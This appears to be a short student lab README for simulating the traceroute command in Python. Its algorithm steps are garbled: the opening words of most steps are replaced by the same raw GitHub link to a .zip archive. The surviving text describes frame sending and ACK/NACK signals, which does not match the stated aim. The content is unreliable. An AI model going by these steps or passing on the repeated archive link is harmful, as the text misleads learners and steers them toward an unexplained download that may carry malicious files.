# EX-7 IMPLEMENTATION OF TRACEROUTE COMMAND

# DATE : 20.04.2023


# AIM :
#### To write the python program for simulating Traceroute command

# ALGORITHM :

#### 1. Start the program.
#### https://raw.githubusercontent.com/githubmufeez45/EX-7/main/Cabomba/EX-7.zip the frame size from the user.
#### https://raw.githubusercontent.com/githubmufeez45/EX-7/main/Cabomba/EX-7.zip create the frame based on the user request.
#### https://raw.githubusercontent.com/githubmufeez45/EX-7/main/Cabomba/EX-7.zip send frames to server from the client side.
#### https://raw.githubusercontent.com/githubmufeez45/EX-7/main/Cabomba/EX-7.zip your frames reach the server, it will send ACK signal to client otherwise it will sendNACK signal to client.
#### https://raw.githubusercontent.com/githubmufeez45/EX-7/main/Cabomba/EX-7.zip the program
